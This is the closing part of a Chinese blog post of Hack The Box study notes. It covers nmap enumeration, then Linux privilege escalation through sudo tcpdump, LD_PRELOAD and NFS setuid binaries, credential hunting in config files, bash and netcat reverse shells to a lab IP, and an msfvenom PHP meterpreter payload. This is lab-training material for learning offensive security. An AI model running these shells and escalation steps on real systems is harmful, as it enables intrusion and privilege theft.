+<h1 id="Knowledge-Check"><a href="#Knowledge-Check" class="headerlink" title="Knowledge Check"></a>Knowledge Check</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">这一个模块是给出一个IP 使用上面学到的方法进行攻击。</span><br><span class="line">给了一些提示资料：</span><br><span class="line">1. 用Nmap 扫描端口</span><br><span class="line">2. whatweb 和 Gobuster cms和路径扫描</span><br><span class="line">3. 如果知道了网站的域名 改 /etc/hosts 让网站显示全部</span><br><span class="line">4. Searchsploit  找公开漏洞利用</span><br><span class="line">5. 得到反弹shell后用 Python3 pty 提升一下终端的使用体验</span><br><span class="line">6. 执行文件系统的手动和自动枚举，以查找错误配置、具有已知漏洞的服务以及明文形式的敏感数据（如凭据）</span><br><span class="line">7. 有两种方法得到shell。一种是Metasploit  一种是手动执行</span><br><span class="line">8. 提权方法 可以用 下面两种</span><br><span class="line">https://github.com/rebootuser/LinEnum</span><br><span class="line">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到目标</span></span><br><span class="line">10.129.225.231</span><br><span class="line"><span class="comment"># 安装所需工具</span></span><br><span class="line">$ sudo apt install exploitdb -y</span><br><span class="line">$ searchsploit openssh 7.2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先用nmap 扫下看开了哪些端口</span></span><br><span class="line">nmap -sV --open -oA nibbles_initial_scan 10.129.225.231</span><br><span class="line"></span><br><span class="line">sudo apt-get install libxml2-utils 安装一个xml解析工具</span><br><span class="line"><span class="comment"># https://gtfobins.github.io/   这里有很多提权的方式   这里有收集一些正常文件用来利用提权拿shell的方法</span></span><br></pre></td></tr></table></figure>
+<h1 id="Linux-Privilege-Escalation"><a href="#Linux-Privilege-Escalation" class="headerlink" title="Linux Privilege Escalation"></a>Linux Privilege Escalation</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找可写目录</span></span><br><span class="line">$ find / -path /proc -prune -o -<span class="built_in">type</span> d -perm -o+w 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 查找可写文件</span></span><br><span class="line">$ find / -path /proc -prune -o -<span class="built_in">type</span> f -perm -o+w 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kernel Exploits</span></span><br><span class="line">$ https://github.com/dirtycow/dirtycow.github.io</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bash 单行反向 shell</span></span><br><span class="line"><span class="comment"># http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</span></span><br><span class="line"><span class="comment"># 反弹</span></span><br><span class="line">$ bash -i &gt;&amp; /dev/tcp/10.10.15.169/443 0&gt;&amp;1</span><br><span class="line"><span class="comment"># 监听</span></span><br><span class="line">$ nc -lnvp 443</span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊权限提权 https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits</span></span><br><span class="line"><span class="comment"># suid: find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</span></span><br><span class="line"><span class="comment"># guid: find / -user root -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sudo Rights Abuse sudo 提权</span></span><br><span class="line">$ cat /tmp/.<span class="built_in">test</span>  (建立文件)</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.169 443 &gt;/tmp/f</span><br><span class="line"><span class="comment">#执行 $ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</span></span><br><span class="line"><span class="comment"># 开监听 $ nc -lnvp 443</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径滥用</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="comment"># 通配符滥用</span></span><br><span class="line"><span class="comment"># 凭证搜寻</span></span><br><span class="line">$ cat wp-config.php | grep <span class="string">'DB_USER\|DB_PASSWORD'</span></span><br><span class="line">$  find / ! -path <span class="string">"*/proc/*"</span> -iname <span class="string">"*config*"</span> -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">$  ls ~/.ssh</span><br><span class="line"><span class="comment"># 共享库 LD_PRELOAD 权限提升</span></span><br><span class="line">$ cat &lt;&lt; EOF &gt; root.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">_init</span></span>() &#123;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="comment"># 编译时报错可忽略</span></span><br><span class="line">$ gcc -fPIC -shared -o root.so root.c -nostartfiles</span><br><span class="line">执行提权： $ sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 共享对象劫持</span></span><br><span class="line">Ldd显示对象的位置以及它被加载到每个程序依赖项的内存中的十六进制地址</span><br><span class="line"></span><br><span class="line"><span class="comment"># Privileged Groups</span></span><br><span class="line"><span class="comment"># 杂技</span></span><br><span class="line">showmount -e</span><br><span class="line">cat /etc/exports</span><br><span class="line"></span><br><span class="line">cat &lt;&lt; EOF &gt; shell.c </span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">  setuid(0); setgid(0); system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">showmount -e 10.129.170.31</span><br><span class="line">gcc shell.c -o shell</span><br><span class="line">sudo mount -t nfs 10.129.170.31:/tmp /mnt</span><br></pre></td></tr></table></figure>
+<h1 id="使用MSF建立反弹SHELL"><a href="#使用MSF建立反弹SHELL" class="headerlink" title="使用MSF建立反弹SHELL"></a>使用MSF建立反弹SHELL</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成shell</span></span><br><span class="line">$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.15.169 LPORT=4444 &gt; msfshell.php</span><br><span class="line">$ python3 -m http.server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将shell上传到靶主机中，然后使用msfconsole连接。</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD /php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 10.10.15.169</span><br><span class="line"><span class="built_in">set</span> PORT 4444</span><br><span class="line">run</span><br><span class="line">python3 -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+<p>QQ群：397745473</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+            <a href="/tags/网络安全/" rel="tag"># 网络安全</a>
+          
+           <a href="https://book.xd10086.com/categories/%E9%BB%91%E5%AE%A2/" rel="tag"># 黑客书籍</a>
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/08/18/204_debian搭建渗透环境记录/" rel="next" title="debian搭建渗透环境记录">
+                <i class="fa fa-chevron-left"></i> debian搭建渗透环境记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/08/25/206_AutoJs学习记录/" rel="prev" title="AutoJs学习记录">
+                AutoJs学习记录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+    <div class="post-spread">
+<script data-ad-client="ca-pub-9873623505122626" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<img src="https://i.imgur.com/eGNMc8d.png" alt="知识星球">
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+<script data-ad-client="ca-pub-9873623505122626" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="https://i.imgur.com/luMBjvD.jpg" alt="vsyour">
+          <p class="site-author-name" itemprop="name">vsyour</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">206</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">30</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">72</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/vsyour" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/vsyour" target="_blank" title="新浪微博">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  新浪微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/vsyour" target="_blank" title="FaceBook">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  FaceBook
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.vksec.com/" title="Openresti" target="_blank">Openresti</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.vsyour.com/" title="Blog" target="_blank">Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://vksec.com/2018/01/29/23_vksec_操作记录/" title="操作记录" target="_blank">操作记录</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://shang.qq.com/wpa/qunwpa?idkey=c3e0580ecf8d705036d1901d44121f3b4e2c3b6a4ad7b417e968784345b01380" title="QQ群" target="_blank">QQ群</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Basic-Toolset"><span class="nav-number">1.</span> <span class="nav-text">Basic Toolset</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重点记录"><span class="nav-number">2.</span> <span class="nav-text">重点记录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#parrotsec-系统"><span class="nav-number">3.</span> <span class="nav-text">parrotsec 系统</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nmap-扫描"><span class="nav-number">4.</span> <span class="nav-text">nmap 扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">5.</span> <span class="nav-text">web</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Public-Exploits"><span class="nav-number">6.</span> <span class="nav-text">Public Exploits</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shells"><span class="nav-number">7.</span> <span class="nav-text">Shells</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-number">8.</span> <span class="nav-text">Privilege Escalation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Transferring-Files"><span class="nav-number">9.</span> <span class="nav-text">Transferring Files</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Starting-Out"><span class="nav-number">10.</span> <span class="nav-text">Starting Out</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Navigating-HTB"><span class="nav-number">11.</span> <span class="nav-text">Navigating HTB</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nibbles-Enumeration"><span class="nav-number">12.</span> <span class="nav-text">Nibbles - Enumeration</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Knowledge-Check"><span class="nav-number">13.</span> <span class="nav-text">Knowledge Check</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-Privilege-Escalation"><span class="nav-number">14.</span> <span class="nav-text">Linux Privilege Escalation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用MSF建立反弹SHELL"><span class="nav-number">15.</span> <span class="nav-text">使用MSF建立反弹SHELL</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">vsyour</span>
+</div>
+
+
+<!-- <div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+-->
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://vksec.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://vksec.com/2021/08/19/205_hackthebox学习记录/';
+          this.page.identifier = '2021/08/19/205_hackthebox学习记录/';
+          this.page.title = 'hackthebox学习记录';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://vksec.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            var resultItems = [];
+            if (this.value.trim().length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCountInArticle = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCountInArticle = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  var resultItem = '';
+
+                  function highlightKeyword(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+
+                    var matchText = text.substring(start, end);
+                    var matchResult = [];
+                    var prevEnd = 0;
+                    while (position + word.length <= end && index.length != 0) {
+
+                      // highlight keyword
+
+                      var wordBegin = position - start;
+                      var wordEnd = position - start + word.length;
+                      matchResult.push(matchText.substring(prevEnd, wordBegin));
+                      matchResult.push("<b class=\"search-keyword\">" + matchText.substring(wordBegin, wordEnd) + "</b>");
+
+                      // move to next position of hit
+
+                      index.pop();
+                      prevEnd = wordEnd;
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (prevEnd > position - start) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    matchResult.push(matchText.substring(prevEnd));
+                    return matchResult.join('');
+                  }
+
+                  // sort index by position of keyword
+
+                  indexOfTitle.sort(function (itemLeft, itemRight) {
+                    return itemRight.position - itemLeft.position;
+                  });
+
+                  indexOfContent.sort(function (itemLeft, itemRight) {
+                    return itemRight.position - itemLeft.position;
+                  });
+
+                  // highlight title
+
+                  if (indexOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, 0, title.length, indexOfTitle) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  // highlight content
+
+                  var resultUpperBound = parseInt(1);
+                  var withoutUpperBound = false;
+                  if (resultUpperBound === -1) {
+                    withoutUpperBound = true;
+                  }
+                  var currentResultNum = 0;
+                  while (indexOfContent.length != 0 && (withoutUpperBound || (currentResultNum < resultUpperBound))) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                    "<p class=\"search-result\">" + highlightKeyword(content, start, end, indexOfContent) +
+                    "...</p>" + "</a>";
+                    currentResultNum++;
+                  }
+                  resultItem += "</li>";
+                  resultItems.push({item: resultItem, hitCount: hitCountInArticle, id: resultItems.length});
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              $resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              $resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.hitCount != resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultLeft.id - resultRight.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result, i) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              $resultContent.innerHTML = searchResultList;
+            }
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
